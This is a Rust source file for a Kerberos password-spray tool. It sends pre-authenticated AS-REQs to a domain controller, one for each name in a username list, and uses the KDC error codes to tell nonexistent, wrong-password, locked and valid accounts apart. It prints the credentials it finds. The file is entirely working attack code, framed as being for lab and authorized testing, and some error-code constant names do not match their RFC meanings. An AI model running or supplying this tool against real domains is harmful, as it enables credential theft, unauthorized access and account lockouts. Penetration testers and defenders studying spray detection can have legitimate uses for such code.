// kerspray.rs — Kerberos password spray tool (kerlab)
// Improved: error handling, safe-mode, delay, named constants, clap hygiene

use clap::{Arg, Command};
use kerlab::encryption::EncryptionKey;
use kerlab::krbkdcrep::AsRep;
use kerlab::krbkdcreq::{AsReq, KdcOptionsType};
use kerlab::request::{KrbResponse, TcpRequest};
use std::fs::File;
use std::io::{self, BufRead};
use std::thread::sleep;
use std::time::Duration;

const APPLICATION_NAME: &str = "kerspray";

// Kerberos KDC error codes (RFC 4120 §7.5.9)
const KRB_ERR_C_PRINCIPAL_UNKNOWN: i32 = 6;  // Username does not exist
const KRB_AP_ERR_BAD_INTEGRITY: i32 = 24;    // Wrong password (preauth failed)
const KDC_ERR_CLIENT_REVOKED: i32 = 18;       // Account locked out or disabled

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let matches = Command::new(APPLICATION_NAME)
        .version("0.2.0")
        .author("Sylvain Peyrefitte <citronneur@gmail.com>")
        .about("Kerberos password spray — for lab, detection, and authorized testing only")
        .arg(
            Arg::new("dc")
                .long("dc")
                .value_name("HOST")
                .required(true)
                .help("IP or hostname of the Domain Controller"),
        )
        .arg(
            Arg::new("port")
                .long("port")
                .value_name("PORT")
                .default_value("88")
                .value_parser(clap::value_parser!(u16)) // validated as a number
                .help("Kerberos port on the Domain Controller"),
        )
        .arg(
            Arg::new("domain")
                .long("domain")
                .value_name("DOMAIN")
                .required(true)
                .help("Windows domain name (e.g. CORP.LOCAL)"),
        )
        .arg(
            Arg::new("password")
                .long("password")
                .value_name("PASSWORD")
                .required(true)
                .help("Password to spray against all usernames"),
        )
        .arg(
            Arg::new("file")
                .long("file")
                .value_name("FILE")
                .required(true)
                .help("File containing one username per line"),
        )
        .arg(
            Arg::new("safe")
                .long("safe")
                .action(clap::ArgAction::SetTrue)
                .help("Stop spraying on first account lockout (KDC error 18)"),
        )
        .arg(
            Arg::new("delay")
                .long("delay")
                .value_name("MS")
                .default_value("0")
                .value_parser(clap::value_parser!(u64))
                .help("Milliseconds to wait between each attempt (reduce lockout risk)"),
        )
        .arg(
            Arg::new("pause")
                .long("pause")
                .action(clap::ArgAction::SetTrue)
                .help("Pause and wait for Enter after each successful credential find"),
        )
        .get_matches();

    // --- Argument extraction (all validated/required above, safe to unwrap) ---
    let ip = matches.get_one::<String>("dc").unwrap();
    let port = matches.get_one::<u16>("port").unwrap();
    let domain = matches.get_one::<String>("domain").unwrap();
    let password = matches.get_one::<String>("password").unwrap();
    let file_path = matches.get_one::<String>("file").unwrap();
    let safe_mode = matches.get_flag("safe");
    let pause_on_hit = matches.get_flag("pause");
    let delay_ms = *matches.get_one::<u64>("delay").unwrap();

    let target = format!("{}:{}", ip, port);

    // Open userlist — surface a clean error rather than a panic
    let file = File::open(file_path)
        .map_err(|e| format!("Cannot open '{}': {}", file_path, e))?;

    let kdc_options = vec![KdcOptionsType::Renewable, KdcOptionsType::RenewableOk];

    eprintln!(
        "[*] Spraying '{}' against {} users via {} (safe={}, delay={}ms)",
        password,
        // Count lines for user info without consuming the reader
        io::BufReader::new(File::open(file_path)?).lines().count(),
        target,
        safe_mode,
        delay_ms,
    );

    // Re-open after counting
    let file = File::open(file_path)
        .map_err(|e| format!("Cannot reopen '{}': {}", file_path, e))?;

    for (i, line) in io::BufReader::new(file).lines().enumerate() {
        let username = match line {
            Ok(u) if !u.trim().is_empty() => u.trim().to_string(),
            Ok(_) => continue, // skip blank lines
            Err(e) => {
                eprintln!("[!] Error reading line {}: {}", i + 1, e);
                continue;
            }
        };

        // Throttle between attempts to reduce lockout risk
        if delay_ms > 0 {
            sleep(Duration::from_millis(delay_ms));
        }

        // Build AS-REQ
        let tgt_request = match AsReq::new(domain, username.as_str(), &kdc_options) {
            Ok(req) => req,
            Err(e) => {
                eprintln!("[!] Failed to build AS-REQ for '{}': {:?}", username, e);
                continue;
            }
        };

        let tgt_request = match tgt_request
            .with_preauth(&EncryptionKey::new_rc4_hmac(password).unwrap())
        {
            Ok(req) => req,
            Err(e) => {
                eprintln!("[!] Failed to attach preauth for '{}': {:?}", username, e);
                continue;
            }
        };

        // Send request; skip user on network/parse failure rather than crashing
        let tgt_response =
            match TcpRequest::ask_for::<AsRep, String>(&tgt_request, target.clone()) {
                Ok(r) => r,
                Err(e) => {
                    eprintln!("[!] Network/parse error for '{}': {:?}", username, e);
                    continue;
                }
            };

        match tgt_response {
            KrbResponse::Error(e) => {
                let code = e.inner.error_code.inner;
                match code {
                    KRB_ERR_C_PRINCIPAL_UNKNOWN => {
                        println!("[-] Not found:    {}\\{}", domain, username)
                    }
                    KRB_AP_ERR_BAD_INTEGRITY => {
                        println!("[-] Wrong password: {}\\{}", domain, username)
                    }
                    KDC_ERR_CLIENT_REVOKED => {
                        println!(
                            "[!] LOCKED/DISABLED: {}\\{} (error {})",
                            domain, username, code
                        );
                        // --safe: abort the entire spray to avoid further lockouts
                        if safe_mode {
                            eprintln!("[!] Safe mode: stopping spray to prevent further lockouts.");
                            return Ok(());
                        }
                    }
                    _ => println!(
                        "[?] Unknown error {}: {}\\{}",
                        code, domain, username
                    ),
                }
            }

            KrbResponse::Response(_) => {
                println!("*******************************************");
                println!("[+] VALID: {}\\{} : {}", domain, username, password);
                println!("*******************************************");

                // --pause: wait for operator acknowledgement before continuing
                if pause_on_hit {
                    eprintln!("[*] Press Enter to continue...");
                    let mut buf = String::new();
                    io::stdin()
                        .read_line(&mut buf)
                        .expect("Failed to read stdin");
                }
            }
        }
    }

    Ok(())
}
